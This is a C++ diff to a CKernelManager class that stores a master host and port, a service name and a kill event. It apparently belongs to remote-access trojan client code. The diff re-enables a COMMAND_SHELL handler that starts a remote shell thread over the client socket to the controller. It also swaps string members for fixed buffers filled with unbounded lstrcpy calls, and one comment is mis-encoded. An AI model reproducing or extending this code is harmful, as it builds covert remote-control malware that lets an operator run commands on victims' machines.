@@ -8,7 +8,7 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CString	CKernelManager::m_strMasterHost = _T("");
+wchar_t	CKernelManager::m_strMasterHost[256] = {0};
 UINT	CKernelManager::m_nMasterPort = 80;
 CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
 	LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
@@ -16,15 +16,12 @@ CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, 
 
 	if (lpszServiceName != NULL)
 	{
-		//lstrcpy(m_strServiceName, lpszServiceName);
-		m_strServiceName = lpszServiceName;
+		lstrcpy(m_strServiceName, lpszServiceName);
 	}
 	if (lpszKillEvent != NULL)
-		m_strKillEvent = lpszKillEvent;
-		//lstrcpy(m_strKillEvent, lpszKillEvent);
+		lstrcpy(m_strKillEvent, lpszKillEvent);
 	if (lpszMasterHost != NULL)
-		m_strMasterHost = lpszMasterHost;
- 		//lstrcpy(m_strMasterHost, lpszMasterHost);
+ 		lstrcpy(m_strMasterHost, lpszMasterHost);
 
 	m_nMasterPort = nMasterPort;
 	m_dwServiceType = dwServiceType;
@@ -78,10 +75,10 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 
 
 
-// 	case COMMAND_SHELL: // Ô¶³Ìsehll
-// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
-// 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
-// 		break;
+	case COMMAND_SHELL: // Ô¶³Ìsehll
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
+			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
+		break;
 
 
 
